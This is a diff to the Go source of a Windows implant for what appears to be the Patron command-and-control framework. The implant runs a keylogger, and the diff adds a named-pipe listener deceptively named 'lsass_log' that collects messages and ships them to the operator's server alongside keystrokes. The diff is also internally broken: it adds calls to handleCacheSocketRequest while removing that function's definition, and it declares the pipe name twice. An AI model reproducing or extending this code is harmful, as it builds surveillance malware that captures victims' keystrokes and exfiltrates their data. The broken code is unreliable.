@@ -1,9 +1,13 @@
 package main
 
 import (
+	"bytes"
+	"context"
 	"fmt"
 	"io"
 	"log"
+	"os"
+	"os/signal"
 	"strings"
 	"sync"
 	"syscall"
@@ -12,6 +16,7 @@ import (
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils"
 	"github.com/PatronC2/Patron/client/client_utils/windows/keylogger"
+	"github.com/PatronC2/Patron/client/client_utils/windows/windows_utils"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/kardianos/service"
@@ -30,7 +35,13 @@ var (
 
 const (
 	delayKeyfetchMS = 5
+	pipeName        = `\\.\pipe\lsass_log`
 )
+
+type spool struct {
+	mu  sync.Mutex
+	buf bytes.Buffer
+}
 
 type program struct{}
 
@@ -65,6 +76,8 @@ func (p *program) run() {
 
 	client_utils.Initialize(LoggingEnabled)
 
+	pipeName := `\\.\pipe\lsass_log`
+
 	keylogger := keylogger.NewKeylogger()
 
 	go func() {
@@ -76,6 +89,35 @@ func (p *program) run() {
 			}
 			time.Sleep(delayKeyfetchMS * time.Millisecond)
 		}
+	}()
+
+	// Handle socket listener
+	var (
+		mu      sync.Mutex
+		builder strings.Builder
+	)
+
+	sock := windows_utils.New(pipeName, func(msg string) error {
+		mu.Lock()
+		defer mu.Unlock()
+
+		builder.WriteString(msg)
+		logger.Logf(logger.Debug, "Got message from socket at %v: %v", pipeName, msg)
+		return nil
+	})
+
+	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
+	errCh := make(chan error, 1)
+
+	go func() {
+		errCh <- sock.Run(ctx)
+	}()
+
+	go func() {
+		<-ctx.Done()
+		logger.Log(logger.Info, "Signal received, stopping socket...")
+		sock.Stop()
+		stop()
 	}()
 
 	agentID, hostname, username := client_utils.GenerateAgentMetadata()
@@ -122,6 +164,11 @@ func (p *program) run() {
 
 		if err := handleKeysRequest(beacon, agentID); err != nil {
 			client_utils.HandleError(beacon, "keylogs", err)
+			continue
+		}
+
+		if err := handleCacheSocketRequest(beacon, agentID, &mu, &builder); err != nil {
+			client_utils.HandleError(beacon, "cachesocket", err)
 			continue
 		}
 
@@ -187,42 +234,5 @@ func handleKeysRequest(beacon io.ReadWriteCloser, agentID string) error {
 	}
 
 	cache = ""
-	return nil
-}
-
-func handleCacheSocketRequest(beacon io.ReadWriteCloser, agentID string, mu *sync.Mutex, builder *strings.Builder) error {
-	mu.Lock()
-
-	if builder.Len() == 0 {
-		logger.Logf(logger.Info, "No logs to send, skipping socket cache request")
-		mu.Unlock()
-		return nil
-	}
-
-	data := builder.String()
-	builder.Reset()
-	mu.Unlock()
-
-	logger.Logf(logger.Info, "Sending cache data: %v", data)
-
-	req := &patronobuf.Request{
-		Type: patronobuf.RequestType_KEYS,
-		Payload: &patronobuf.Request_Keys{
-			Keys: &patronobuf.KeysRequest{
-				Uuid: agentID,
-				Keys: data,
-			},
-		},
-	}
-
-	if err := common.WriteDelimited(beacon, req); err != nil {
-		return fmt.Errorf("failed to send keys request: %w", err)
-	}
-
-	resp := &patronobuf.Response{}
-	if err := common.ReadDelimited(beacon, resp); err != nil {
-		return fmt.Errorf("failed to read keys response: %w", err)
-	}
-
 	return nil
 }
